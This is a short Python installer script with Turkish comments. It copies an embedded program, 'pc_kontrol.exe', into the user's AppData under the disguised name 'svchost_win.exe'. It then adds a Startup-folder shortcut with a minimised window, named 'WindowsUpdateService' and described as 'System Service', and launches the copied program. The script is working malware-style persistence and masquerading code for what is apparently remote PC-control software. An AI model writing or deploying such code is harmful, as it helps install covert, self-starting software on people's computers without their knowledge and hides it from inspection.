import os
import sys
import shutil
import subprocess
import time


# --- İÇERİ GÖMÜLEN DOSYAYI BULMA FONKSİYONU ---
def get_resource_path(relative_path):
    """ Nuitka ile temp klasörüne açılan dosyayı bulur """
    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(__file__)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)


def create_shortcut(target_path, shortcut_name):
    """ Başlangıç klasörüne kısayol oluşturur """
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_path = os.path.join(startup_folder, shortcut_name + ".lnk")
    working_dir = os.path.dirname(target_path)

    vbs_code = f"""
    Set oWS = WScript.CreateObject("WScript.Shell")
    Set oLink = oWS.CreateShortcut("{shortcut_path}")
    oLink.TargetPath = "{target_path}"
    oLink.WorkingDirectory = "{working_dir}"
    oLink.WindowStyle = 7 
    oLink.Description = "System Service"
    oLink.Save
    """

    vbs_path = os.path.join(os.environ["TEMP"], "create_shortcut.vbs")
    try:
        with open(vbs_path, "w") as file:
            file.write(vbs_code)
        subprocess.call(["cscript", "//NoLogo", vbs_path], shell=True)
        os.remove(vbs_path)
        return True
    except:
        return False


def install():

    source_path = get_resource_path("pc_kontrol.exe")


    target_dir = os.path.join(os.environ["APPDATA"], "SystemConfig")
    target_path = os.path.join(target_dir, "svchost_win.exe")

    if not os.path.exists(target_dir):
        try:
            os.makedirs(target_dir)
        except:
            pass


    if os.path.exists(source_path):
        try:

            os.system("taskkill /f /im svchost_win.exe >nul 2>&1")
            time.sleep(1)
            shutil.copy2(source_path, target_path)

            if create_shortcut(target_path, "WindowsUpdateService"):
                subprocess.Popen(target_path, shell=True)

        except Exception as e:
            pass
    else:
        pass

if __name__ == "__main__":
    install()